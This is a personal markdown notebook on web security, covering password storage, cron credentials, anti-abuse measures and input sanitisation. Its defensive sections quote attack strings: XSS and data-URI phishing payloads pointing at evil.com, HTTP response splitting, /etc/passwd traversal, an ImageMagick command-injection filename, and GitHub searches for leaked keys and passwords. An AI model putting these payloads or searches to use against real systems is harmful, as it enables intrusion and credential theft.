> A chain is only as strong as its weakest link

- [A collection of awesome penetration testing resources](https://github.com/enaqx/awesome-pentest)

Against attacks, read/write access or modifications

- [Public-key cryptography — Wikipedia](https://en.wikipedia.org/wiki/Public-key_cryptography)
- [RSA \(cryptosystem\) — Wikipedia](https://en.wikipedia.org/wiki/RSA_(cryptosystem))
- [Portail:Cryptologie — Wikipédia](https://fr.wikipedia.org/wiki/Portail:Cryptologie)
- [Portail:Sécurité informatique — Wikipédia](https://fr.wikipedia.org/wiki/Portail:S%C3%A9curit%C3%A9_informatique)
- [59Hardware - Dossier : La cryptographie](http://wayback.archive.org/web/20090227061422/http://59hardware.net/Tests/Jeux_Videos_et_Logiciels/Dossier_:_La_cryptographie.html)

## Password storage

Aka authentification data storage

See [Password](#password)

Use [bcrypt](http://en.wikipedia.org/wiki/Bcrypt) or a better one: https://github.com/p-h-c/phc-winner-argon2

**The issue with bcrypt is the limited supported password to [max 72 chars](https://stackoverflow.com/questions/3002828/bcrypt-says-long-similar-passwords-are-equivalent-problem-with-me-the-gem-o/4772058#4772058).**
To circumvent that you need to create a hash (ex: SHA512, 64 bytes) of that password before. But don't treat the hash as hexa string, but as bytes. See "You're not really going to help people much who use long passwords by hashing first. Some groups you can definitely help. Some you can definitely hurt." [php - How to hash long passwords (\>72 characters) with blowfish - Stack Overflow](https://stackoverflow.com/questions/16594613/how-to-hash-long-passwords-72-characters-with-blowfish/16597402#16597402)
See also [cryptography - Pre-hash password before applying bcrypt to avoid restricting password length - Information Security Stack Exchange](https://security.stackexchange.com/questions/6623/pre-hash-password-before-applying-bcrypt-to-avoid-restricting-password-length) and [sha 256 - Is there a way to use bcrypt with passwords longer than 72 bytes securely? - Cryptography Stack Exchange](https://crypto.stackexchange.com/questions/24993/is-there-a-way-to-use-bcrypt-with-passwords-longer-than-72-bytes-securely)

- [Plain Text Offenders](http://plaintextoffenders.com/) [plaintextoffenders/offenders.csv at master · plaintextoffenders/plaintextoffenders](https://github.com/plaintextoffenders/plaintextoffenders/blob/master/offenders.csv)
- [L'art de stocker des mots de passe - LinuxFr.org](https://linuxfr.org/users/elyotna/journaux/l-art-de-stocker-des-mots-de-passe)
- [Choosing the Right Cryptography Library for your PHP Project: A Guide - Paragon Initiative Enterprises Blog](https://paragonie.com/blog/2015/11/choosing-right-cryptography-library-for-your-php-project-guide)
- [Storing Passwords in a Highly Parallelized World · Homepage of Hynek Schlawack](https://hynek.me/articles/storing-passwords/)
- https://github.com/PolyPasswordHasher/PolyPasswordHasher
- [start [CBCrypt]](https://cbcrypt.org/doku.php)
- [Agile Blog | On hashcat and strong Master Passwords as your best protection](https://blog.agilebits.com/2013/04/16/1password-hashcat-strong-master-passwords/)
- [Secure Salted Password Hashing - How to do it Properly](https://crackstation.net/hashing-security.htm)
- [Portable PHP password hashing ("password encryption") framework](http://www.openwall.com/phpass/)
- [How To Safely Store A Password | codahale.com](http://codahale.com/how-to-safely-store-a-password/)
- [Serious Security: How to store your users’ passwords safely | Naked Security](https://nakedsecurity.sophos.com/2013/11/20/serious-security-how-to-store-your-users-passwords-safely/)
- [What technical reasons are there to have low maximum password lengths? - Information Security Stack Exchange](http://security.stackexchange.com/questions/33470/what-technical-reasons-are-there-to-have-low-maximum-password-lengths/33471#33471)
- [Serious Security: How to store your users’ passwords safely – Naked Security](https://nakedsecurity.sophos.com/2013/11/20/serious-security-how-to-store-your-users-passwords-safely/)
- [How Dropbox securely stores your passwords | Dropbox Tech Blog](https://blogs.dropbox.com/tech/2016/09/how-dropbox-securely-stores-your-passwords/)
- search public leaked authentification informations
	VCS revision contains password 
	
	- [Google Hacking Database, GHDB, Google Dorks](https://www.exploit-db.com/google-hacking-database/)
	- https://github.com/search?p=2&q=mysqli_connect+http&type=Code
	- https://github.com/search?q=%22rds.amazonaws.com%22&type=Code
	- https://github.com/search?utf8=&q=id_rsa&type=Commits&ref=searchresults
	- https://github.com/search?p=2&q=smtp.gmail.com+pass&ref=searchresults&type=Code&utf8=%E2%9C%93
	- https://github.com/search?p=2&q=DriverManager.getConnection%28&ref=searchresults&type=Code&utf8=%E2%9C%93
	- https://github.com/search?q=DBI.connect&ref=searchresults&type=Code&utf8=%E2%9C%93
	- https://github.com/search?utf8=%E2%9C%93&q=add+secret&type=Commits&ref=searchresults https://github.com/search?utf8=%E2%9C%93&q=add+secrets&type=Commits&ref=searchresults
	- https://github.com/search?utf8=%E2%9C%93&q=add+password&type=Commits&ref=searchresults https://github.com/search?utf8=%E2%9C%93&q=add+passwords&type=Commits&ref=searchresults
	- https://github.com/search?p=2&q=remove+password+oops&ref=searchresults&type=Commits&utf8=%E2%9C%93
	- https://github.com/search?utf8=%E2%9C%93&q=remove+password&type=Commits&ref=searchresults
	- https://github.com/search?utf8=&q=changed+password&type=Commits&ref=searchresults
	- [GitLeaks - Search Engine for exposed secrets on the web](https://gitleaks.com/)

### Crendentials used in job schedulers

Like cron tasks

Executed commands or env vars appears in `ps` or in system log (could be transmited by email, etc.)

Commands often support external config file (curl: `.netrc`, mysql: `.my.cnf`, wget: `.wgetrc`, etc.). Use it with a restricted read access (only 400 or 600 mode for the specific user `chmod u=wr,g=,o= config`).
Alternatively, you can set the password in env vars `MYSQL_PWD="foo" mysqldump -ubackup --all-databases > dump.sql`

Some commands (ssh, sftp, scp, git, rsync, and any other commands that use SSH) support [SSH server](https://www.jveweb.net/en/archives/2010/08/defining-ssh-servers.html) (`man ssh_config`) and SSH keys:

```sh
host="theservername"
hostname="subdomain.domain.tld"
user="username"
port=34567

cat << EOF >> ~/.ssh/config

Host $host
HostName $hostname
User $username
Port $port
IdentityFile ~/.ssh/${user}@${hostname}_key
EOF

ssh-keygen -t rsa -b 4096 -C "$user" -f "~/.ssh/${user}@${hostname}_key" -N "" -q
# instead of "ssh -p 34567 username@subdomain.domain.tld" you can now use "ssh theservername""
```

Some other commands (curl, wget, rexec, ftp) support [`.netrc` file](https://www.gnu.org/software/inetutils/manual/html_node/The-_002enetrc-file.html) password file. Use as follow:

```
machine ftp.cyberciti.biz
login myusername
password mypassword
```

```sh
chmod u=wr,g=,o= .netrc
# if used as root:
#sudo chown root .netrc
```

See also [.netrc - Everything curl](https://ec.haxx.se/usingcurl/usingcurl-netrc)

You can also use a SFTP batch file (`-d`) and all similar mecanisms

- [Password-less login](#password-less-login)
- SSH: use `ssh-keygen` (see `ssh-copy-id`) `ssh-keygen -t rsa -f keyfile -N ""` (create keyfile without passphrase)
- [BashFAQ/069 - Greg's Wiki](http://mywiki.wooledge.org/BashFAQ/069) - "I want to automate an ssh (or scp, or sftp) connection, but I don't know how to send the password...."
- [how to pass a password with a cron job safely? - Unix & Linux Stack Exchange](http://unix.stackexchange.com/questions/176747/how-to-pass-a-password-with-a-cron-job-safely)
- [script - Where to store security credentials (aka passwords) for special cron jobs? - Super User](http://superuser.com/questions/420033/where-to-store-security-credentials-aka-passwords-for-special-cron-jobs)
- [mysql - Mysqldump launched by cron and password security - Stack Overflow](https://stackoverflow.com/questions/6861355/mysqldump-launched-by-cron-and-password-security)
- [How can I automate an SFTP transfer between two servers? - Ask Leo!](https://askleo.com/how_can_i_automate_an_sftp_transfer_between_two_servers/)
- [How to mirror/sync a remote ftp folder with a local folder | Sina Salek Official Site](http://sina.salek.ws/content/how-mirrorsync-remote-ftp-folder-local-folder)
- [authentication - How can I set up password-less SSH login? - Ask Ubuntu](http://askubuntu.com/questions/46930/how-can-i-set-up-password-less-ssh-login)
- [Easiest way to copy ssh keys to another machine? - Ask Ubuntu](http://askubuntu.com/questions/4830/easiest-way-to-copy-ssh-keys-to-another-machine/4833#4833)

## Secret sharing

Multiple private keys

Symmetric algorithm (like AES) + public key encryption algorithm (like RSA)

![This Lock Can Be Opened With 1 Lock ... No Matter Which One](This%20lock%20can%20be%20opened%20with%201%20lock%20...%20no%20matter%20which%20one.jpg) (OR gate, doesn't share the same key, using multiple private keys, see the [reddit post](https://www.reddit.com/r/pics/comments/68jboj/this_lock_can_be_opened_with_1_lock_no_matter/). See also daisychain locks / Multiple Padlock)

- [Secret sharing — Wikipedia](https://en.wikipedia.org/wiki/Secret_sharing)
- [encryption - Multiple private keys - Cryptography Stack Exchange](https://crypto.stackexchange.com/questions/44846/multiple-private-keys/44849#44849)
- [Multiple private keys for single public key - Cryptography Stack Exchange](https://crypto.stackexchange.com/questions/24125/multiple-private-keys-for-single-public-key/24128#24128)

## Prevent and detect violation

Aka breach

**You can defeat majority of violation but never all.**

![Secured](Prevent%20violation/Secured.jpg)
![When You Only Enforce Input Validations Client Side](Prevent%20violation/When%20you%20only%20enforce%20input%20validations%20client-side.jpg)

Content submission: bots create account, add review, video, message / post (SPAM), aimbot faking play games (cheat), etc.

- **never give feedback** if a violation is detected
- move the trust logic to the trusted party (the server, central logic) or as validator authority (validate transaction / scores with replay-data)
- sponsor: New account need a sponsor (acquaintance) (engage his responsibility) or publicly ask for it to all members by providing additional identifications elements (profile on other website: social network, personal website, etc.)
	Use human resource to verify the identity of the seeker

	* https://www.journalduhacker.net/login
- use captcha (Turing test)
	- [I'm Not a Human : Breaking the Google reCAPTCHA](https://www.blackhat.com/docs/asia-16/materials/asia-16-Sivakorn-Im-Not-a-Human-Breaking-the-Google-reCAPTCHA-wp.pdf)
	- [chihuahua or muffin, sheepdog or mop , puppy or bagel, labradoodle or fried chickenshiba or marshmallow, parrot or guacamole, etc.](https://twitter.com/teenybiscuit/status/667777205397680129)
- use nonce or cookies
- require a phone number, verify it (by sending a verification code). Check reused for different accounts
- verify email (send an verification link)
- authentificate with [multi-factors](https://en.wikipedia.org/wiki/Multi-factor_authentication) see also [Universal 2nd Factor](https://en.wikipedia.org/wiki/Universal_2nd_Factor)
- [prevent XSS and injection](#xss-and-injection-prevention)
- check emptyness and validate values. See [Third party data](#third-party-data)
- use time as a limit (lifespan)
- denunciation / reporting
- blacklist or whitelists of IPs (or ranges), browsers, clients names, words, etc.
- use `/robots.txt`:
    ```
	User-agent: *
	Disallow: /
    ```
- use honeypots
	"It's a trap"
    
    ```html
	<!-- Require CSS support. Add hidden (display: none) input field and detect if it's filled. -->
	<style>
	/* email h0n3yp07 */
	#test_email{
		display: none;
	}
	</style>
	<input id="real_email" type="email" name="real_email" size="25" value="">
	<input id="test_email" type="email" name="email" size="25" value="">
	<!-- if test_email if filled, the sender have a high probability to trick you -->
    ```

	Or add hidden fake entries (for a directory page with list of file). If the link is accessed, there is a high probability it's a scrapper. What append if the trigger link is discovered and inserted in ads / others websites (to trigger false positive)... by using rotation (detect only in some periode of time)?
	
	Use instead quota or slowdown or auto logout (and reduce timeout/quantity each time) mechanisms to prevent scrapping. Display a message to allow the user to contact you directy, by email or phone in case it's really legit.

	- add fake data, aka "copyright trap", "paper town". [Fictitious entry — Wikipedia](https://en.wikipedia.org/wiki/Fictitious_entry) Ex: for map data provider add fake town, etc. [Agloe, New York — Wikipedia](https://en.wikipedia.org/wiki/Agloe,_New_York)
	- [html - How do I prevent site scraping? - Stack Overflow](https://stackoverflow.com/questions/3161548/how-do-i-prevent-site-scraping/3161695#3161695)
	- [Fictitious entry — Wikipedia](https://en.wikipedia.org/wiki/Fictitious_entry)
	- [Publisher under fire for fake article webpages : Nature News & Comment](http://www.nature.com/news/publisher-under-fire-for-fake-article-webpages-1.20154)
	- Crawlers and scrappers https://github.com/JayBizzle/Crawler-Detect
	- [The Web's Largest Community Tracking Online Fraud & Abuse | Project Honey Pot](http://www.projecthoneypot.org/)
- include archive or image bomb but not used as is (attack). Ex: use it raw data as key for encryption. See [Exploits](Compression#exploits)
	- [10 GB in a 27 KB Gzip File \[My Present To HTTP Scanners\] -](https://rehmann.co/blog/10-gb-27-kb-gzip-file-present-http-scanners/)
- detect physically impossible for one human to react below some timespan or to move quicker than some speed or repeat too much times similar action (flood). Ex. nobody could send 100 reviews in few days (specially if the reviews are more than 100 chars)
	Use statistics (point cloud, graphs, threshold, etc.) and compare with the average people. Ex: ingame real people can't always aim perfectly (perfect angles values)
- [Copyright infringement](Conception#copyright-infringement)
- use counter-measure against side-channel leaks based on time (timing attack):
	See [Timing attack](#timing-attack)

For contexts where code/data is given to untrusted parties (games, webapp, downloaded native app):

- [Hide data](#hide-data)
- encrypted files (code) use param provided by the preloader. If the default value is used instead, the app run in a standalone mode: someone try to hack it (track IP + all infos)
- Always force a fresh download of preloaders (dynamically generated?)
- no hard coded keys, tokens and IDs in source code
    - `/admin/.git/config`, `/backup20200227.zip`, etc.
    - [Bots also regularly check for .git in common folders: 404 - GET /admin/.git/con... | Hacker News](https://news.ycombinator.com/item?id=22431627)
- remove debug symbols
- save value snapshots at random time interval
- check memory alteration. Never store a numeric or a string of the result / score. Use pointer, etc.
- use intergrity checks / DRM: [Subresource Integrity](#subresource-integrity), native non overwritable class method of VM API, etc.
- detect tools and modifications:

    ```js
	// See [795547 - Detecting deveoper tools open status kinda againis your princibles - chromium - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=795547#c8)
	// See [799791 - DevTools can be detected using redefined nodeType getter - chromium - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=799791#c3)
	Object.defineProperty(new Image()/*document.createElement("any")*/, "nodeType", {
		get: function() {
			// web tools are active (Chrome)
			return 1;
		}
	});
	```
    
    ```js
	var minimalUserResponseInMiliseconds = 100;
	var before = Date.now();
	debugger;
	if (Date.now() - before > minimalUserResponseInMiliseconds) {
		// user had to resume the script manually via opened dev tools
	}

	// Detects if DevTools are open
	// (assuming that user has caching disabled when DevTools are open which is common)
	// works in all major browsers

	// some cachable resource to check
	const resource = 'https://code.jquery.com/jquery-3.2.1.slim.min.js';
	// skip first check
	let first = true;

	setInterval(() => {
		const start = Date.now();
		fetch(resource).then(() => {
			if (first) {
				first = false;
				return;
			}
			if (Date.now() - start >= 10) { // resource is not cached
				// No cache in dev tools is active
			}
		});
	}, 1000);

	var baseline_measurements = [];
	var measurements = 20;
	var warmup_runs = 3;
	
	const status = document.documentElement.appendChild(document.createTextNode("DevTools are closed"));
	const junk = document.documentElement.insertBefore(document.createElement("div"), document.body);
	junk.style.display = "none";
	const junk_filler = new Array(1000).join("junk");
	const fill_junk = () => {
		var i = 10000;
		while (i--) {
			junk.appendChild(document.createTextNode(junk_filler));
		}
	};
	const measure = () => {
		if (measurements) {
			const baseline_start = performance.now();
			fill_junk();
			baseline_measurements.push(performance.now() - baseline_start);
			junk.textContent = "";
			measurements--;
			setTimeout(measure, 0);
		} else {
			baseline_measurements = baseline_measurements.slice(warmup_runs); // exclude unoptimized runs
			const baseline = baseline_measurements.reduce((sum, el) => sum + el, 0) / baseline_measurements.length;
		
			setInterval(() => {
				// In actual usage you would also check document.hasFocus()
				// as background tabs are throttled and get false positives
				const start = performance.now();
				fill_junk();
				const time = performance.now() - start;
				status.data = "DevTools are " + (time > 1.77 * baseline ? "open" : "closed");
				junk.textContent = "";
			}, 1000);
		}
	};
	
	setTimeout(measure, 200);
    ```

    ```js
	var threshold = 160;
	setInterval(function () {
			var widthThreshold = window.outerWidth - window.innerWidth > threshold;
			var heightThreshold = window.outerHeight - window.innerHeight > threshold;
			
			if (!(heightThreshold && widthThreshold) && ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)) {
				// devtools is opened
			} else {
				// devtools is closed (or undocked, or a sidebar is opened)
			}
	}, 500);
    ```
	
	- [DevTools Undocked · Issue #15 · sindresorhus/devtools-detect · GitHub](https://github.com/sindresorhus/devtools-detect/issues/15#issuecomment-215908435)
	- [sindresorhus/devtools-detect: Detect if DevTools is open and its orientation](https://github.com/sindresorhus/devtools-detect)

Automated systems are not perfect, humans too

> A good approach would be to white-list non-infringing sources
— [Warner Brothers reports own site as illegal - BBC News](http://www.bbc.com/news/technology-37275603), [Warner Bros. flags own site for piracy, orders Google to censor pages | Ars Technica](http://arstechnica.com/tech-policy/2016/09/warner-bros-flags-own-site-for-piracy-dmca-google/)

- [Interview d'un vendeur de cheat et enquête auprès des développeurs de jeux vidéo](http://www.nofrag.com/2016/mai/28/49198/)
- [Securing a Flash game’s variables using flash_proxy | Kinsman Games](https://kinsmangames.wordpress.com/2010/04/08/securing-a-flash-games-variables-using-flash_proxy/)
- [actionscript 3 - What is the best way to stop people hacking the PHP-based highscore table of a Flash game - Stack Overflow](https://stackoverflow.com/questions/73947/what-is-the-best-way-to-stop-people-hacking-the-php-based-highscore-table-of-a-f)
- [DVIA (Damn Vulnerable iOS App) - A vulnerable iOS app for pentesting](http://damnvulnerableiosapp.com/)
- [Cheating in online games — Wikipedia](https://en.wikipedia.org/wiki/Cheating_in_online_games)
- [Cheating in Video Games » Feross.org](http://feross.org/cheating-in-video-games/)
- [Sécurité par l'obscurité](http://fr.wikipedia.org/wiki/S%C3%A9curit%C3%A9_par_l%27obscurit%C3%A9)
- [Security through obscurity - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Security_through_obscurity)
- [Flash Player Security Advanced Walkthrough | jpauclair](https://jpauclair.net/2009/12/11/flash-player-security-advanced-walkthrough/)
- [How to protect flash games](how_to_protect_flash_games.pdf)

See also [Hacking](#hacking)

### Hide data

See [Hide data](./Hide%20data/Hide%20data.md)

### Third party data

It's unsafe data. You need to handle care and isolate it.

**Never rely the data comes from outside your application (user inputs, front application messages, thrid party server messages).**
Clean it depends it usage. Ex.: when send a mail, remove all "\n\r" of all header fields

- don't use native deserialization. Use XML, JSON or [Query string](https://en.wikipedia.org/wiki/Query_string) formats. [Deserialization of untrusted data - OWASP](https://www.owasp.org/index.php/Deserialization_of_untrusted_data)
- [escape character](https://en.wikipedia.org/wiki/Escape_character)
- `intval($input)`
- `filter_var($input, FILTER_VALIDATE_EMAIL)`
- [Data Validation « WordPress Codex](https://codex.wordpress.org/Data_Validation)
- use dedicated domain for hosting third party documents/resources (image, HTML, CSS, JS). For proxing, etc.
- [minimaxir/big-list-of-naughty-strings: The Big List of Naughty Strings is a list of strings which have a high probability of causing issues when used as user-input data.](https://github.com/minimaxir/big-list-of-naughty-strings)
- [The Hitchhiker's Guide to SQL Injection prevention](https://phpdelusions.net/sql_injection)
- text, URL, link, 2D/3D data can contains offencive (insult, nudity, obscenity, etc.) text, scene, symbol, gesture, etc. in an image, 3D object, points on a map, ASCII text image
	**Text: Don't think you can manage the problem with just a blacklist of words** (what about lookalike, slang, backward-slang?)
	Forbidden/profanity words domains: Politic, racism, religious, sex, insults, drogs, weight (related to food industry), competing/rival companies...
	
	> If it can be killed, people will kill it. If it can't be killed, people will try and may succeed. If it can be destroyed, it will always be broken. If it can be moved, people will draw dongs or write obscenities with it.
	
	See [User generated content problems](Conception#User generated content problems)

	- [Scunthorpe problem — Wikipedia](https://en.wikipedia.org/wiki/Scunthorpe_problem)
	- [Text transform](Text#Text transform)
	- [shortened URLs](https://en.wikipedia.org/wiki/URL_shortening#Shortcomings)
	- [Slip Me Some Skin - The Hacker Factor Blog](http://www.hackerfactor.com/blog/index.php?/archives/479-Slip-Me-Some-Skin.html) - Problems with skin-detection algorithms
	- [SwiftOnSecurity on Twitter: "YouTube comments are now in color, apparently https://t.co/lCtNI76L6u"](https://twitter.com/SwiftOnSecurity/status/772643289434509312) - Draw swastika with ascii art (here with colored [Block Element](https://en.wikipedia.org/wiki/Block_Elements))
	- [Erik D Aker on Twitter: "Thi guy sped by me on the freeway. Had a strong feeling thi wa a Unicode codepoint. In my gut I knew what it was. https://t.co/4B3oHSXXAi"](https://twitter.com/erewok/status/699788390166695936) - Licence plate with then unicode representation U+1F595, see 🖕, [The finger - Wikipedia](https://en.wikipedia.org/wiki/The_finger)
	- [ASCII art - Wikipedia](https://en.wikipedia.org/wiki/ASCII_art)
	- [All the dirty word from Google' "what do you love" project: http://www.wdyl.com/](https://gist.github.com/jamiew/1112488)
	- [Support for multiple language by wagoid · Pull Request #6 · KanoComputing/nodejs-profanity-util](https://github.com/KanoComputing/nodejs-profanity-util/pull/6/files) - Multilanguages swearwords
	- [Seven dirty word - Wikipedia](https://en.wikipedia.org/wiki/Seven_dirty_words)
	- [Category:English swear word - Wiktionary](https://en.wiktionary.org/wiki/Category:English_swear_words)
	- [Megan Spoopy Fox on Twitter: "Funny story - we were asked to make dong detection software for LEGO Universe too. We found it to be utterly impossible at any scale."](https://twitter.com/glassbottommeg/status/604407061380640768)
- clipboard data
	* [Copy & Pest - A case-study on the clipboard, blind trust and invisibl…](http://www.slideshare.net/x00mario/copypest)
- CSS
	- [A timing attack with CSS selectors and Javascript](https://blog.sheddow.xyz/css-timing-attack/) - `document.querySelector(location.hash)`
	- [Scriptless Attacks - Stealing the Pie without touching the Sill](http://www.slideshare.net/x00mario/stealing-the-pie/)
- [JavaScript - Unsafe HTML](JavaScript#unsafe-html)

Always store data from third party in an external folder, outside root of the web server, and use `open_basedir` to protect against local inclusion

See also

- [Vulnerabilities](#vulnerabilities)
- [Safe String Theory for the Web — Acko.net](http://acko.net/blog/safe-string-theory-for-the-web/)

#### Unsafe HTML

- **Do not decode with `s.replace(/&amp;/g, "&").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&#39;/g, "'").replace(/&quot;/g, '"')`** https://github.com/WebReflection/html-escaper#why https://github.com/WebReflection/html-escaper/blob/master/html.js https://github.com/mathiasbynens/he
- **Note: All browsers don't support the same syntax** [HTML5 Security Cheatsheet - A collection of HTML5 related XSS attack vectors](https://github.com/cure53/H5SC) see [XSS and injection vulnerabilities](#xss-and-injection-vulnerabilities)
- [Detergent.io](https://detergent.io/) and [codsen/detergent: The text cleaner/encoder for web and email development](https://github.com/codsen/detergent)
- `<noscript><noscript></noscript><script>confirm(1)</script></noscript>`
- `htmlspecialchars()` or (`htmlentities()`). `'<a href="' . htmlspecialchars($url) . '">Link</>'` You can use `ENT_QUOTES` as flag to escape simple quotes. And you should check the protocol of `$url` before.
	`<form name="test" action="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>" method="post">` else `http://example.com/form.php?d=%22%3E%3Cscript%3Ealert('xss')%3C/script%3E%3Cfoo%22`
	
	- [Using PHP_SELF in the action field of a form](http://www.html-form-guide.com/php-form/php-form-action-self.html)
- Escape JSON in HTML
	* In element's attribute
		`<div data-test="<?php echo htmlspecialchars(json_encode($data, JSON_HEX_TAG | JSON_UNESCAPED_SLASHES)) ?>">`
	* In `<script type="application/json">`, in `<script>` (where type will be `application/javascript`, and use `JSON_PARTIAL_OUTPUT_ON_ERROR`) or any other element
		`echo 'var data = ' . json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP | JSON_UNESCAPED_SLASHES);`
	
	* [php - Is json_encode Sufficient XSS Protection? - Stack Overflow](https://stackoverflow.com/questions/12062146/is-json-encode-sufficient-xss-protection)
	* [php - Why does JSON encoder adds escaping character when encoding URLs? - Stack Overflow](https://stackoverflow.com/questions/3723243/why-does-json-encoder-adds-escaping-character-when-encoding-urls)
- `esc_attr($value)`

#### Unsafe chars

- [Unicode Security Guide](http://websec.github.io/unicode-security-guide/)
- can contains special chars and emoji: `éà}`, etc. Ex: emoji in bank account nickname broke banking system https://twitter.com/ajlobster/status/735240869859753985
- [Glitchr ‮ (@glitchr_) / Twitter](https://mobile.twitter.com/glitchr_)

#### Unsafe URI

- `http://example.com` and `http://example.com.` are the same, but could treated differently (ex: cookies). See [Why does putting a dot after the URL remove login information?](https://superuser.com/questions/1467958/why-does-putting-a-dot-after-the-url-remove-login-information/1468139#1468139)
- `http://evil.com/@good.com` the domain is not `good.com`
- `http://good.com%2f@evil.com/` the domain is not `good.com`
- `file://my.domain/tmp/example.html` the domain is `my.domain`, but often ignored
- `https://accounts.youtube.com/accounts/SetSID?continue=https://www.google.com/amp/s/evil.com/evil.swf` (redirect to `evil.swf`) redirection (account login, etc.) don't know if the trusted target, has been compromized (or allow this kind of redirection)
- `http://good.com%0a%0a%0aTrust%20me.%20It%27s%20totally%20legit.%09%09%09%09%09%0a%0a%0a%0a%0a%0a%0a%0a@evil.com/` is a valid URL, but could be displayed in browser URL bar (or link hover) as `http://good.com`
- `http://x%0aContent-Length%3a99%0a%0a.victim.website/1` and `http://victim.website%00.attacker.website/evil.html` (null char wrongly used to break the domain as `victim.website`). See [Webkit URLs](https://alf.nu/WebkitURLs)
- `xn--wkd-8cdx9d7hbd.org` is not equal to `wіkіpеdіа.org`, but look the same in browser address bar It's a valid [IDN](https://en.wikipedia.org/wiki/Internationalized_domain_name#ASCII_spoofing_concerns) which use [punycode](https://en.wikipedia.org/wiki/Punycode) encoding
- on `http://good.com` URL `//evil.com` the domain is `evil.com`
- filter out data URIs:
	* `data:text/html;charset=UTF-8,https://good.com/some/long/path/follwed/by/html/<html><body><form action=http://evil.com><button>Fake re-login form</button></form></body></html>`
	* `data:text/html;charset=UTF-8,alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}`
	Retect to parameter `http://victim.com/?param=value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>`
	https://www.owasp.org/index.php/Testing_for_HTTP_Splitting/Smuggling_(OTG-INPVAL-016)
- filter out file URIs. If you get its content (like PHP `file_get_contents()`): `file:///etc/passwd`
	* [If your code accepts URIs as input..](https://blog.steve.fi/If_your_code_accepts_URIs_as_input__.html)
- `http://e­x­a­m­p­l­e­.­com` is not `http://example.com` (use SHY - U+00AD chars)
	> Soft hyphens have been used to obscure malicious domains or URLs in e-mail spam.
	[Soft hyphen — Wikipedia](https://en.wikipedia.org/wiki/Soft_hyphen#Security_issues)
	
	Many browsers ignore SHY chars in URL. That means `http://e­x­a­m­p­l­e­.­com` will be interpreted as `http://example.com`
- Some chars in file path are not supported on Windows: [Git for Windows accidentally creates NTFS alternate data streams](http://latkin.org/blog/2016/07/20/git-for-windows-accidentally-creates-ntfs-alternate-data-streams/) with char `:` in filename
- `urlencode()` and `rawurlencode()` for URLs `$url = 'http://localhost/' . rawurlencode($page) . '?foo=' . urlencode($foo) . '&bar=' . urlencode($bar)`. The same with `encodeURI()`, `encodeURIComponent()`
	See also [`http_build_query()`](http://php.net/manual/en/function.http-build-query.php) and [`parse_url()`](http://docs.php.net/manual/en/function.parse-url.php)
- `snprintf(&s, 0x80u, "texts/%s.json", ".////////////////////////////////////////////////////////////////////////////////////////../../../../../etc/passwd")` overflow the 128 byte string value
- `http://localhost`, `http://0`, `http://[::0]`
- [Google Safe Browsing  |  Google Developers](https://developers.google.com/safe-browsing/) - Chrome, Firefox, Safari, etc. use this service to alert users for fraudulent websites

#### Unsafe HTTP headers

- `$_SERVER['HTTP_HOST']` contains value defined by the `Host:` header.
- `$_SERVER['SERVER_NAME']` can contains the value defined by the `Host:` header.
	Unless [UseCanonicalName](http://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname) (for Apache) is set or name-based virtual hosts are used (but still the case for the default site / default server).
	- [php - HTTP_HOST vs. SERVER_NAME - Stack Overflow](https://stackoverflow.com/questions/2297403/http-host-vs-server-name/2297421#2297421)
	- [apache - PHP $_SERVER\['HTTP_HOST'\] vs. $_SERVER\['SERVER_NAME'\], am I understanding the man pages correctly? - Stack Overflow](https://stackoverflow.com/questions/1459739/php-serverhttp-host-vs-serverserver-name-am-i-understanding-the-ma/1461430#comment1309905_1460201)
	- [CommonMisconfigurations - Httpd Wiki](https://wiki.apache.org/httpd/CommonMisconfigurations#Not_setting_a_ServerName_in_a_virtual_host.)
	- [How nginx processes a request](http://nginx.org/en/docs/http/request_processing.html#how_to_prevent_undefined_server_names)
	- [server-configs-nginx/no-default at master · h5bp/server-configs-nginx](https://github.com/h5bp/server-configs-nginx/blob/master/sites-available/no-default)
	
	```
	# Ngnix
	# no default server
	# prevent host header attacks, or other potential problems when an unknown servername is used in a request, drop the request
	server {
		listen 80 default_server;
		return 444;
	}
	```
- HTTP Cache poisoning using Host header: `Host: evilsite.com#`
	* [15KB Of Fame: HTTP Cache Poisoning via Host Header Injection](http://carlos.bueno.org/2008/06/host-header-injection.html)
	* [Skeleton Scribe: Practical HTTP Host header attacks](http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html)
	* [HTTP HOST header attacks](http://www.slideshare.net/DefconRussia/http-host-header-attacks)
	
	See also [Cache Poisoning - OWASP](https://www.owasp.org/index.php/Cache_Poisoning)
- take care of HTTP headers especially `Host`, `Origin`, `Referer`, etc. Don't trust `User-Agent`. Clean value in returned `Location`, `Set-Cookie` (escape them)

#### Unsafe filename

For filename see also [Unsafe URI](#unsafe-uri) and [Unsafe name](#unsafe-name)

- filename, remove path separators `/` and ignore `.` and `..` (ex: `../../etc/passwd`, `folder/../../../etc/passwd`) or use something like `in_array(array_diff(scandir($directory), array('..', '.')), $filename)` to compare
- check filename of uploaded files. Some lib (like ImageMagick) use patterns to treat files: `*`, `@`, `#`, `|`, `` `: [File Handling -- IM v6 Examples](http://www.imagemagick.org/Usage/files/)
	example, an uploaded SVG handled server side by ImageMagick: `<svg><image xlink:href="|echo Hello > hello.txt; cat /usr/lib/firefox/browser/icons/mozicon128.png"></image></svg>`
	* [CVE-2016-5118 : The OpenBlob function in blob.c in GraphicsMagick before 1.3.24 and ImageMagick allows remote attackers to execute arbit](http://www.cvedetails.com/cve/CVE-2016-5118/)
	* [oss-sec: CVE Request: GraphicsMagick and ImageMagick popen() shell vulnerability via filename](http://seclists.org/oss-sec/2016/q2/432)
- remove any special chars

#### Unsafe files content

From upload and loaded files / data

See [Unsafe filename](#unsafe-filename)

- check upload file type with magic number:
	* [Remote code execution vulnerability in ImageMagick | Hacker News](https://news.ycombinator.com/item?id=11624056)
